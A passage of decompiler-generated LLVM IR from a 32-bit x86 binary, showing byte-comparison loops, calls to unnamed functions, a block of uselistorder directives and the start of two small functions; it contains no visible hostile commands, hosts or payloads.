  %v1_804d5fc = add i32 %v0_804d5fc, 8412
  %v2_804d5fc = inttoptr i32 %v1_804d5fc to i32*
  %v3_804d5fc = load i32, i32* %v2_804d5fc, align 4
  store i32 %v3_804d5fc, i32* %eax.global-to-local, align 4
  %v2_804d603 = inttoptr i32 %v0_804d5fc to i32*
  store i32 %v3_804d5fc, i32* %v2_804d603, align 4
  %v0_804d606 = load i32, i32* @ebx, align 4
  %v1_804d606 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d606 = sub i32 %v0_804d606, %v1_804d606
  %v8_804d606 = xor i32 %v1_804d606, %v0_804d606
  %v9_804d606 = xor i32 %v2_804d606, %v0_804d606
  %v10_804d606 = and i32 %v9_804d606, %v8_804d606
  %v11_804d606 = icmp slt i32 %v10_804d606, 0
  %v13_804d606 = icmp slt i32 %v2_804d606, 0
  %v2_804d608 = icmp eq i1 %v13_804d606, %v11_804d606
  br i1 %v2_804d608, label %dec_label_pc_804d60a, label %dec_label_pc_804d5fc.dec_label_pc_804d630_crit_edge

dec_label_pc_804d5fc.dec_label_pc_804d630_crit_edge: ; preds = %dec_label_pc_804d5fc
  %v0_804d630.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d630

dec_label_pc_804d60a:                             ; preds = %dec_label_pc_804d5fc
  %v0_804d60f = load i32, i32* @esp, align 4
  %v10_804d613 = icmp eq i32 %v0_804d606, 0
  br i1 %v10_804d613, label %dec_label_pc_804d630, label %dec_label_pc_804d618.preheader

dec_label_pc_804d618.preheader:                   ; preds = %dec_label_pc_804d60a
  %v1_804d60f = add i32 %v0_804d60f, 56
  %v1_804d618 = add i32 %v0_804d60f, 28
  %v2_804d618 = inttoptr i32 %v1_804d618 to i32*
  %v1_804d749 = inttoptr i32 %v0_804d60f to i32*
  br label %dec_label_pc_804d618

dec_label_pc_804d618:                             ; preds = %dec_label_pc_804d618.preheader, %dec_label_pc_804d62a
  %v0_804d62a.in = phi i32 [ %v0_804d62a, %dec_label_pc_804d62a ], [ %v0_804d606, %dec_label_pc_804d618.preheader ]
  %v0_804d748 = phi i32 [ %v3_804d61e76, %dec_label_pc_804d62a ], [ 0, %dec_label_pc_804d618.preheader ]
  %v4_804d61c = phi i32 [ %v6_804d61c, %dec_label_pc_804d62a ], [ %v1_804d606, %dec_label_pc_804d618.preheader ]
  %v0_804d752 = phi i32 [ %v1_804d629, %dec_label_pc_804d62a ], [ %v1_804d60f, %dec_label_pc_804d618.preheader ]
  %v0_804d62a = add i32 %v0_804d62a.in, -1
  %v3_804d618 = load i32, i32* %v2_804d618, align 4
  store i32 %v3_804d618, i32* @edi, align 4
  %v1_804d61c = inttoptr i32 %v0_804d752 to i8*
  %v2_804d61c = load i8, i8* %v1_804d61c, align 1
  %v3_804d61c = zext i8 %v2_804d61c to i32
  %v5_804d61c = and i32 %v4_804d61c, -256
  %v6_804d61c = or i32 %v3_804d61c, %v5_804d61c
  store i32 %v6_804d61c, i32* %eax.global-to-local, align 4
  %v4_804d61e = add i32 %v3_804d618, %v0_804d748
  %v5_804d61e = inttoptr i32 %v4_804d61e to i8*
  %v6_804d61e = load i8, i8* %v5_804d61e, align 1
  %v17_804d61e = icmp eq i8 %v2_804d61c, %v6_804d61e
  br i1 %v17_804d61e, label %dec_label_pc_804d748, label %dec_label_pc_804d627

dec_label_pc_804d627:                             ; preds = %dec_label_pc_804d618
  br label %dec_label_pc_804d62a

dec_label_pc_804d62a:                             ; preds = %dec_label_pc_804d748, %dec_label_pc_804d627
  %v3_804d61e76 = phi i32 [ 0, %dec_label_pc_804d627 ], [ %v1_804d748, %dec_label_pc_804d748 ]
  %v1_804d629 = add i32 %v0_804d752, 1
  %v10_804d62b = icmp eq i32 %v0_804d62a, 0
  %v1_804d62e = icmp eq i1 %v10_804d62b, false
  br i1 %v1_804d62e, label %dec_label_pc_804d618, label %dec_label_pc_804d630

dec_label_pc_804d630:                             ; preds = %dec_label_pc_804d62a, %dec_label_pc_804d5fc.dec_label_pc_804d630_crit_edge, %dec_label_pc_804d60a
  %v0_804d630 = phi i32 [ %v0_804d630.pre, %dec_label_pc_804d5fc.dec_label_pc_804d630_crit_edge ], [ %v0_804d60f, %dec_label_pc_804d60a ], [ %v0_804d60f, %dec_label_pc_804d62a ]
  %v1_804d630 = add i32 %v0_804d630, 8424
  %v2_804d630 = inttoptr i32 %v1_804d630 to i32*
  %v3_804d630 = load i32, i32* %v2_804d630, align 4
  store i32 %v3_804d630, i32* %eax.global-to-local, align 4
  %v2_804d637 = inttoptr i32 %v0_804d630 to i32*
  store i32 %v3_804d630, i32* %v2_804d637, align 4
  %v0_804d63a = load i32, i32* @ebx, align 4
  %v1_804d63a = load i32, i32* %eax.global-to-local, align 4
  %v2_804d63a = sub i32 %v0_804d63a, %v1_804d63a
  %v8_804d63a = xor i32 %v1_804d63a, %v0_804d63a
  %v9_804d63a = xor i32 %v2_804d63a, %v0_804d63a
  %v10_804d63a = and i32 %v9_804d63a, %v8_804d63a
  %v11_804d63a = icmp slt i32 %v10_804d63a, 0
  %v13_804d63a = icmp slt i32 %v2_804d63a, 0
  %v2_804d63c = icmp eq i1 %v13_804d63a, %v11_804d63a
  br i1 %v2_804d63c, label %dec_label_pc_804d63e, label %dec_label_pc_804d630.dec_label_pc_804d668_crit_edge

dec_label_pc_804d630.dec_label_pc_804d668_crit_edge: ; preds = %dec_label_pc_804d630
  %v0_804d668.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d668

dec_label_pc_804d63e:                             ; preds = %dec_label_pc_804d630
  %v0_804d643 = load i32, i32* @esp, align 4
  %v10_804d647 = icmp eq i32 %v0_804d63a, 0
  br i1 %v10_804d647, label %dec_label_pc_804d668, label %dec_label_pc_804d650.preheader

dec_label_pc_804d650.preheader:                   ; preds = %dec_label_pc_804d63e
  %v1_804d643 = add i32 %v0_804d643, 56
  %v1_804d650 = add i32 %v0_804d643, 24
  %v2_804d650 = inttoptr i32 %v1_804d650 to i32*
  %v1_804d759 = inttoptr i32 %v0_804d643 to i32*
  br label %dec_label_pc_804d650

dec_label_pc_804d650:                             ; preds = %dec_label_pc_804d650.preheader, %dec_label_pc_804d662
  %v0_804d662.in = phi i32 [ %v0_804d662, %dec_label_pc_804d662 ], [ %v0_804d63a, %dec_label_pc_804d650.preheader ]
  %v0_804d758 = phi i32 [ %v3_804d65684, %dec_label_pc_804d662 ], [ 0, %dec_label_pc_804d650.preheader ]
  %v4_804d654 = phi i32 [ %v6_804d654, %dec_label_pc_804d662 ], [ %v1_804d63a, %dec_label_pc_804d650.preheader ]
  %v0_804d762 = phi i32 [ %v1_804d661, %dec_label_pc_804d662 ], [ %v1_804d643, %dec_label_pc_804d650.preheader ]
  %v0_804d662 = add i32 %v0_804d662.in, -1
  %v3_804d650 = load i32, i32* %v2_804d650, align 4
  store i32 %v3_804d650, i32* @edi, align 4
  %v1_804d654 = inttoptr i32 %v0_804d762 to i8*
  %v2_804d654 = load i8, i8* %v1_804d654, align 1
  %v3_804d654 = zext i8 %v2_804d654 to i32
  %v5_804d654 = and i32 %v4_804d654, -256
  %v6_804d654 = or i32 %v3_804d654, %v5_804d654
  store i32 %v6_804d654, i32* %eax.global-to-local, align 4
  %v4_804d656 = add i32 %v3_804d650, %v0_804d758
  %v5_804d656 = inttoptr i32 %v4_804d656 to i8*
  %v6_804d656 = load i8, i8* %v5_804d656, align 1
  %v17_804d656 = icmp eq i8 %v2_804d654, %v6_804d656
  br i1 %v17_804d656, label %dec_label_pc_804d758, label %dec_label_pc_804d65f

dec_label_pc_804d65f:                             ; preds = %dec_label_pc_804d650
  br label %dec_label_pc_804d662

dec_label_pc_804d662:                             ; preds = %dec_label_pc_804d758, %dec_label_pc_804d65f
  %v3_804d65684 = phi i32 [ 0, %dec_label_pc_804d65f ], [ %v1_804d758, %dec_label_pc_804d758 ]
  %v1_804d661 = add i32 %v0_804d762, 1
  %v10_804d663 = icmp eq i32 %v0_804d662, 0
  %v1_804d666 = icmp eq i1 %v10_804d663, false
  br i1 %v1_804d666, label %dec_label_pc_804d650, label %dec_label_pc_804d668

dec_label_pc_804d668:                             ; preds = %dec_label_pc_804d662, %dec_label_pc_804d630.dec_label_pc_804d668_crit_edge, %dec_label_pc_804d63e
  %v0_804d677 = phi i32 [ %v0_804d668.pre, %dec_label_pc_804d630.dec_label_pc_804d668_crit_edge ], [ %v0_804d643, %dec_label_pc_804d63e ], [ %v0_804d643, %dec_label_pc_804d662 ]
  %v0_804d56c51 = phi i32 [ %v1_804d63a, %dec_label_pc_804d630.dec_label_pc_804d668_crit_edge ], [ %v1_804d63a, %dec_label_pc_804d63e ], [ %v6_804d654, %dec_label_pc_804d662 ]
  %v1_804d668 = add i32 %v0_804d677, 8408
  %v2_804d668 = inttoptr i32 %v1_804d668 to i32*
  %v3_804d668 = load i32, i32* %v2_804d668, align 4
  %v2_804d66f = sub i32 %v0_804d63a, %v3_804d668
  %v8_804d66f = xor i32 %v3_804d668, %v0_804d63a
  %v9_804d66f = xor i32 %v2_804d66f, %v0_804d63a
  %v10_804d66f = and i32 %v9_804d66f, %v8_804d66f
  %v11_804d66f = icmp slt i32 %v10_804d66f, 0
  %v13_804d66f = icmp slt i32 %v2_804d66f, 0
  %v2_804d671 = icmp eq i1 %v13_804d66f, %v11_804d66f
  br i1 %v2_804d671, label %dec_label_pc_804d677, label %dec_label_pc_804d56c

dec_label_pc_804d677:                             ; preds = %dec_label_pc_804d668
  %v1_804d680125 = add i32 %v0_804d63a, -1
  store i32 %v1_804d680125, i32* @ebx, align 4
  %v10_804d681126 = icmp eq i32 %v0_804d63a, 0
  br i1 %v10_804d681126, label %dec_label_pc_804d56c, label %dec_label_pc_804d68a.lr.ph

dec_label_pc_804d68a.lr.ph:                       ; preds = %dec_label_pc_804d677
  %v1_804d677 = add i32 %v0_804d677, 56
  %v1_804d68a = add i32 %v0_804d677, 20
  %v2_804d68a = inttoptr i32 %v1_804d68a to i32*
  br label %dec_label_pc_804d68a

dec_label_pc_804d68a:                             ; preds = %dec_label_pc_804d68a.lr.ph, %dec_label_pc_804d680.backedge
  %v1_804d680130 = phi i32 [ %v1_804d680125, %dec_label_pc_804d68a.lr.ph ], [ %v1_804d680, %dec_label_pc_804d680.backedge ]
  %v4_804d68e129 = phi i32 [ %v0_804d56c51, %dec_label_pc_804d68a.lr.ph ], [ %v6_804d68e, %dec_label_pc_804d680.backedge ]
  %v0_804d771128 = phi i32 [ %v1_804d677, %dec_label_pc_804d68a.lr.ph ], [ %storemerge32.in, %dec_label_pc_804d680.backedge ]
  %v0_804d768127 = phi i32 [ 0, %dec_label_pc_804d68a.lr.ph ], [ %v3_804d69090, %dec_label_pc_804d680.backedge ]
  %v3_804d68a = load i32, i32* %v2_804d68a, align 4
  store i32 %v3_804d68a, i32* @edi, align 4
  %v1_804d68e = inttoptr i32 %v0_804d771128 to i8*
  %v2_804d68e = load i8, i8* %v1_804d68e, align 1
  %v3_804d68e = zext i8 %v2_804d68e to i32
  %v5_804d68e = and i32 %v4_804d68e129, -256
  %v6_804d68e = or i32 %v3_804d68e, %v5_804d68e
  store i32 %v6_804d68e, i32* %eax.global-to-local, align 4
  %v4_804d690 = add i32 %v3_804d68a, %v0_804d768127
  %v5_804d690 = inttoptr i32 %v4_804d690 to i8*
  %v6_804d690 = load i8, i8* %v5_804d690, align 1
  %v17_804d690 = icmp eq i8 %v2_804d68e, %v6_804d690
  br i1 %v17_804d690, label %dec_label_pc_804d768, label %dec_label_pc_804d699

dec_label_pc_804d699:                             ; preds = %dec_label_pc_804d68a
  br label %dec_label_pc_804d680.backedge

dec_label_pc_804d680.backedge:                    ; preds = %dec_label_pc_804d768, %dec_label_pc_804d699
  %v3_804d69090 = phi i32 [ 0, %dec_label_pc_804d699 ], [ %v1_804d768, %dec_label_pc_804d768 ]
  %storemerge32.in = add i32 %v0_804d771128, 1
  %v1_804d680 = add i32 %v1_804d680130, -1
  store i32 %v1_804d680, i32* @ebx, align 4
  %v10_804d681 = icmp eq i32 %v1_804d680130, 0
  br i1 %v10_804d681, label %dec_label_pc_804d56c, label %dec_label_pc_804d68a

dec_label_pc_804d6a0:                             ; preds = %dec_label_pc_804d5b0
  %v1_804d6a0 = add i32 %v0_804d6a0, 1
  %v2_804d6a1 = load i32, i32* %v1_804d6a1, align 4
  %v14_804d6a1 = icmp eq i32 %v2_804d6a1, %v1_804d6a0
  %v1_804d6a4 = icmp eq i1 %v14_804d6a1, false
  br i1 %v1_804d6a4, label %dec_label_pc_804d5c1, label %dec_label_pc_804d6aa

dec_label_pc_804d6aa:                             ; preds = %dec_label_pc_804d6a0, %dec_label_pc_804d738, %dec_label_pc_804d748, %dec_label_pc_804d758, %dec_label_pc_804d768
  %v0_804d6aa = phi i32 [ %v0_804d677, %dec_label_pc_804d768 ], [ %v0_804d643, %dec_label_pc_804d758 ], [ %v0_804d60f, %dec_label_pc_804d748 ], [ %v0_804d5db, %dec_label_pc_804d738 ], [ %v0_804d5a1, %dec_label_pc_804d6a0 ]
  %v1_804d6ad = add i32 %v0_804d6aa, -16
  %v2_804d6ad = inttoptr i32 %v1_804d6ad to i32*
  store i32 12, i32* %v2_804d6ad, align 4
  %v2_804d6af = call i32 @function_804ebe0(i8 0)
  store i32 %v2_804d6af, i32* %eax.global-to-local, align 4
  %v0_804d6b4 = load i32, i32* @esp, align 4
  %v1_804d6b4 = inttoptr i32 %v0_804d6b4 to i32*
  store i32 13, i32* %v1_804d6b4, align 4
  %v2_804d6bb = call i32 @function_804ebe0(i8 0)
  store i32 %v2_804d6bb, i32* %eax.global-to-local, align 4
  %v0_804d6c0 = load i32, i32* @esp, align 4
  %v1_804d6c0 = inttoptr i32 %v0_804d6c0 to i32*
  store i32 14, i32* %v1_804d6c0, align 4
  %v2_804d6c7 = call i32 @function_804ebe0(i8 0)
  store i32 %v2_804d6c7, i32* %eax.global-to-local, align 4
  %v0_804d6cc = load i32, i32* @esp, align 4
  %v1_804d6cc = inttoptr i32 %v0_804d6cc to i32*
  store i32 15, i32* %v1_804d6cc, align 4
  %v2_804d6d3 = call i32 @function_804ebe0(i8 0)
  store i32 %v2_804d6d3, i32* %eax.global-to-local, align 4
  %v0_804d6d8 = load i32, i32* @esp, align 4
  %v1_804d6d8 = inttoptr i32 %v0_804d6d8 to i32*
  store i32 16, i32* %v1_804d6d8, align 4
  %v2_804d6df = call i32 @function_804ebe0(i8 0)
  store i32 %v2_804d6df, i32* %eax.global-to-local, align 4
  %v0_804d6e4 = load i32, i32* @esp, align 4
  %v1_804d6e4 = inttoptr i32 %v0_804d6e4 to i32*
  %v2_804d6e4 = load i32, i32* %v1_804d6e4, align 4
  store i32 %v2_804d6e4, i32* %eax.global-to-local, align 4
  %v1_804d6e5 = add i32 %v0_804d6e4, 56
  %v2_804d6e5 = inttoptr i32 %v1_804d6e5 to i32*
  %v3_804d6e5 = load i32, i32* %v2_804d6e5, align 4
  store i32 %v3_804d6e5, i32* @edi, align 4
  store i32 %v3_804d6e5, i32* %v1_804d6e4, align 4
  %v1_804d6ea = call i32 @function_804fb51(i32 0)
  store i32 %v1_804d6ea, i32* %eax.global-to-local, align 4
  %v0_804d6ef = load i32, i32* @esp, align 4
  %v1_804d6ef = inttoptr i32 %v0_804d6ef to i32*
  %v2_804d6ef = load i32, i32* %v1_804d6ef, align 4
  store i32 %v2_804d6ef, i32* @ebx, align 4
  %v3_804d6ef = add i32 %v0_804d6ef, 4
  %v1_804d6f0 = inttoptr i32 %v3_804d6ef to i32*
  store i32 9, i32* %v1_804d6f0, align 4
  %v0_804d6f3 = load i32, i32* @ebp, align 4
  store i32 %v0_804d6f3, i32* %v1_804d6ef, align 4
  %v4_804d6f4 = call i32 @function_804fc30(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804d6f4, i32* @eax, align 4
  %v0_804d6f9 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d6fc

dec_label_pc_804d6fc:                             ; preds = %dec_label_pc_804d4a7, %dec_label_pc_804d777, %dec_label_pc_804d6aa
  %v1_804d6fc.in = phi i32 [ %v0_804d4bc, %dec_label_pc_804d4a7 ], [ %v0_804d7bc, %dec_label_pc_804d777 ], [ %v0_804d6f9, %dec_label_pc_804d6aa ]
  %v0_804d6fc = load i32, i32* @ecx, align 4
  %v2_804d6fc = add i32 %v1_804d6fc.in, 12
  %v3_804d6fc = inttoptr i32 %v2_804d6fc to i32*
  store i32 %v0_804d6fc, i32* %v3_804d6fc, align 4
  %v0_804d6fd = load i32, i32* @ecx, align 4
  %v2_804d6fd = add i32 %v1_804d6fc.in, 8
  %v3_804d6fd = inttoptr i32 %v2_804d6fd to i32*
  store i32 %v0_804d6fd, i32* %v3_804d6fd, align 4
  %v1_804d6fe = add i32 %v1_804d6fc.in, 4
  %v2_804d6fe = inttoptr i32 %v1_804d6fe to i32*
  store i32 64, i32* %v2_804d6fe, align 4
  %v0_804d700 = load i32, i32* @ebp, align 4
  store i32 %v0_804d700, i32* @esi, align 4
  %v1_804d702 = add i32 %v1_804d6fc.in, 8328
  store i32 %v1_804d702, i32* @edi, align 4
  %v3_804d709 = inttoptr i32 %v1_804d6fc.in to i32*
  store i32 %v1_804d702, i32* %v3_804d709, align 4
  %v2_804d70a = call i32 @function_804f640(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804d70a, i32* %eax.global-to-local, align 4
  %v0_804d70f = load i32, i32* @esp, align 4
  %v1_804d70f = inttoptr i32 %v0_804d70f to i32*
  %v2_804d70f = load i32, i32* %v1_804d70f, align 4
  store i32 %v2_804d70f, i32* %eax.global-to-local, align 4
  %v3_804d70f = add i32 %v0_804d70f, 4
  %v1_804d710 = inttoptr i32 %v3_804d70f to i32*
  store i32 64, i32* %v1_804d710, align 4
  %v1_804d713 = add i32 %v0_804d70f, 8264
  store i32 %v1_804d713, i32* @eax, align 4
  store i32 %v1_804d713, i32* %v1_804d70f, align 4
  %v2_804d71b = call i32 @function_804f640(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804d71b, i32* %eax.global-to-local, align 4
  %v0_804d720 = load i32, i32* @esp, align 4
  %v1_804d720 = inttoptr i32 %v0_804d720 to i32*
  store i32 1, i32* %v1_804d720, align 4
  %v1_804d727 = call i32 @function_8051700(i32 0)
  store i32 %v1_804d727, i32* %eax.global-to-local, align 4
  %v0_804d72c = load i32, i32* @esp, align 4
  %v1_804d72c = add i32 %v0_804d72c, 24
  %v2_804d72c = inttoptr i32 %v1_804d72c to i32*
  %v3_804d72c = load i32, i32* %v2_804d72c, align 4
  store i32 %v3_804d72c, i32* @ebx, align 4
  %v1_804d730 = add i32 %v0_804d72c, 16
  br label %dec_label_pc_804d230

dec_label_pc_804d738:                             ; preds = %dec_label_pc_804d5e4
  %v1_804d738 = add i32 %v0_804d738, 1
  %v2_804d739 = load i32, i32* %v1_804d739, align 4
  %v14_804d739 = icmp eq i32 %v2_804d739, %v1_804d738
  br i1 %v14_804d739, label %dec_label_pc_804d6aa, label %dec_label_pc_804d5f6

dec_label_pc_804d748:                             ; preds = %dec_label_pc_804d618
  %v1_804d748 = add i32 %v0_804d748, 1
  %v2_804d749 = load i32, i32* %v1_804d749, align 4
  %v14_804d749 = icmp eq i32 %v2_804d749, %v1_804d748
  br i1 %v14_804d749, label %dec_label_pc_804d6aa, label %dec_label_pc_804d62a

dec_label_pc_804d758:                             ; preds = %dec_label_pc_804d650
  %v1_804d758 = add i32 %v0_804d758, 1
  %v2_804d759 = load i32, i32* %v1_804d759, align 4
  %v14_804d759 = icmp eq i32 %v2_804d759, %v1_804d758
  br i1 %v14_804d759, label %dec_label_pc_804d6aa, label %dec_label_pc_804d662

dec_label_pc_804d768:                             ; preds = %dec_label_pc_804d68a
  %v1_804d768 = add i32 %v0_804d768127, 1
  %v12_804d769 = icmp eq i32 %v3_804d668, %v1_804d768
  br i1 %v12_804d769, label %dec_label_pc_804d6aa, label %dec_label_pc_804d680.backedge

dec_label_pc_804d777:                             ; preds = %dec_label_pc_804d56c
  %v2_804d77a = inttoptr i32 %v0_804d581 to i32*
  store i32 12, i32* %v2_804d77a, align 4
  %v2_804d77c = call i32 @function_804ebe0(i8 0)
  store i32 %v2_804d77c, i32* %eax.global-to-local, align 4
  %v0_804d781 = load i32, i32* @esp, align 4
  %v1_804d781 = inttoptr i32 %v0_804d781 to i32*
  store i32 13, i32* %v1_804d781, align 4
  %v2_804d788 = call i32 @function_804ebe0(i8 0)
  store i32 %v2_804d788, i32* %eax.global-to-local, align 4
  %v0_804d78d = load i32, i32* @esp, align 4
  %v1_804d78d = inttoptr i32 %v0_804d78d to i32*
  store i32 14, i32* %v1_804d78d, align 4
  %v2_804d794 = call i32 @function_804ebe0(i8 0)
  store i32 %v2_804d794, i32* %eax.global-to-local, align 4
  %v0_804d799 = load i32, i32* @esp, align 4
  %v1_804d799 = inttoptr i32 %v0_804d799 to i32*
  store i32 15, i32* %v1_804d799, align 4
  %v2_804d7a0 = call i32 @function_804ebe0(i8 0)
  store i32 %v2_804d7a0, i32* %eax.global-to-local, align 4
  %v0_804d7a5 = load i32, i32* @esp, align 4
  %v1_804d7a5 = inttoptr i32 %v0_804d7a5 to i32*
  store i32 16, i32* %v1_804d7a5, align 4
  %v2_804d7ac = call i32 @function_804ebe0(i8 0)
  store i32 %v2_804d7ac, i32* %eax.global-to-local, align 4
  %v0_804d7b1 = load i32, i32* @esp, align 4
  %v1_804d7b1 = inttoptr i32 %v0_804d7b1 to i32*
  %v2_804d7b1 = load i32, i32* %v1_804d7b1, align 4
  store i32 %v2_804d7b1, i32* %eax.global-to-local, align 4
  %v1_804d7b2 = add i32 %v0_804d7b1, 56
  %v2_804d7b2 = inttoptr i32 %v1_804d7b2 to i32*
  %v3_804d7b2 = load i32, i32* %v2_804d7b2, align 4
  store i32 %v3_804d7b2, i32* @edi, align 4
  store i32 %v3_804d7b2, i32* %v1_804d7b1, align 4
  %v1_804d7b7 = call i32 @function_804fb51(i32 0)
  store i32 %v1_804d7b7, i32* @eax, align 4
  %v0_804d7bc = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d6fc

; uselistorder directives
  uselistorder i32 %v1_804d768, { 1, 0 }
  uselistorder i32 %v1_804d680, { 1, 0 }
  uselistorder i32 %v6_804d68e, { 2, 0, 1 }
  uselistorder i32 %v0_804d771128, { 1, 0 }
  uselistorder i32 %v2_804d66f, { 1, 0 }
  uselistorder i32 %v3_804d668, { 1, 0, 2 }
  uselistorder i32 %v0_804d56c51, { 2, 1, 0 }
  uselistorder i32 %v0_804d677, { 0, 4, 5, 6, 3, 2, 1 }
  uselistorder i32 %v6_804d654, { 0, 2, 1 }
  uselistorder i32 %v0_804d758, { 1, 0 }
  uselistorder i32 %v0_804d643, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804d63a, { 1, 0 }
  uselistorder i32 %v1_804d63a, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_804d63a, { 1, 2, 3, 4, 7, 0, 8, 5, 6, 9 }
  uselistorder i32 %v0_804d630, { 1, 0 }
  uselistorder i32 %v6_804d61c, { 1, 0 }
  uselistorder i32 %v0_804d748, { 1, 0 }
  uselistorder i32 %v0_804d60f, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804d606, { 1, 0 }
  uselistorder i32 %v0_804d606, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_804d5fc, { 1, 0 }
  uselistorder i32 %v6_804d5e8, { 1, 0 }
  uselistorder i32 %v0_804d738, { 1, 0 }
  uselistorder i32 %v0_804d5db, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804d5d2, { 1, 0 }
  uselistorder i32 %v0_804d5d2, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_804d5c8, { 1, 0 }
  uselistorder i32 %v6_804d5b4, { 1, 0 }
  uselistorder i32 %v0_804d6a0, { 1, 0 }
  uselistorder i32 %v0_804d5a1, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804d598, { 1, 0 }
  uselistorder i32 %v0_804d598, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_804d56c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804d4a7, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804d484, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v3_804d47f, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804d41a, { 1, 0 }
  uselistorder i32 %v0_804d411, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804d40c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804d41a.pre, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_804d3f3, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_804d3ba, { 0, 2, 1 }
  uselistorder i32 %v4_804d375, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804d31a, { 2, 1, 0 }
  uselistorder i32 %v0_804d2d4, { 1, 0, 2 }
  uselistorder i32 %v1_804d281, { 1, 0 }
  uselistorder i32 %v1_804d27e, { 2, 1, 0 }
  uselistorder i32 %v0_804d27e, { 1, 0, 2 }
  uselistorder i32 %v2_804d27c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804d298, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804d24d, { 1, 0 }
  uselistorder i32 %v1_804d24a, { 1, 0, 2 }
  uselistorder i32 %v0_804d23d, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804d238, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_804d230, { 1, 0 }
  uselistorder i32 %v2_804d1ce, { 1, 0 }
  uselistorder i32 %v3_804d168, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804d126, { 1, 0, 2 }
  uselistorder i32 %v2_804d112, { 3, 2, 4, 0, 5, 6, 7, 8, 1, 9, 10 }
  uselistorder i32 %v1_804d0d5, { 0, 2, 1 }
  uselistorder i32 %v3_804d097, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804d043, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 125, 126, 127, 128, 129, 130, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 120, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 121, 122, 123, 124 }
  uselistorder i32 8424, { 1, 0 }
  uselistorder i32 ()* @function_804fea4, { 2, 1, 0 }
  uselistorder i32 ()* @function_804f920, { 3, 0, 2, 1 }
  uselistorder i32 8264, { 0, 2, 1 }
  uselistorder i32 8328, { 0, 1, 3, 2 }
  uselistorder i32 ()* @function_8050005, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @function_804ff14, { 2, 1, 0 }
  uselistorder i32 4095, { 1, 0 }
  uselistorder i32 (i8*, i32)* @function_804f5d0, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 27, 28, 29, 30, 26, 63, 31, 32, 33, 57, 58, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 59, 60, 61, 62 }
  uselistorder i8 7, { 3, 4, 5, 6, 7, 1, 2, 0 }
  uselistorder i8 6, { 2, 3, 4, 5, 1, 6, 0 }
  uselistorder i32 (i32*)* @function_804fe12, { 1, 2, 3, 0, 4, 5 }
  uselistorder label %dec_label_pc_804d6fc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804d6aa, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804d68a, { 1, 0 }
  uselistorder label %dec_label_pc_804d668, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d650, { 1, 0 }
  uselistorder label %dec_label_pc_804d630, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d618, { 1, 0 }
  uselistorder label %dec_label_pc_804d5fc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d5e4, { 1, 0 }
  uselistorder label %dec_label_pc_804d5c8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d5b0, { 1, 0 }
  uselistorder label %dec_label_pc_804d56c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804d4a7, { 1, 0 }
  uselistorder label %dec_label_pc_804d49b, { 1, 0 }
  uselistorder label %dec_label_pc_804d418, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d3dd, { 1, 0 }
  uselistorder label %dec_label_pc_804d230, { 3, 4, 1, 0, 5, 6, 2, 7 }
  uselistorder label %dec_label_pc_804d1c5, { 1, 0 }
  uselistorder label %dec_label_pc_804d0c4, { 1, 0 }
}

define i32 @function_804d7d0() local_unnamed_addr {
dec_label_pc_804d7d0:
  store i32 134535456, i32* @global_var_8053030.24, align 16
  %v0_804d7da = load i32, i32* @eax, align 4
  ret i32 %v0_804d7da
}

define i32 @function_804d7e0() local_unnamed_addr {
dec_label_pc_804d7e0:
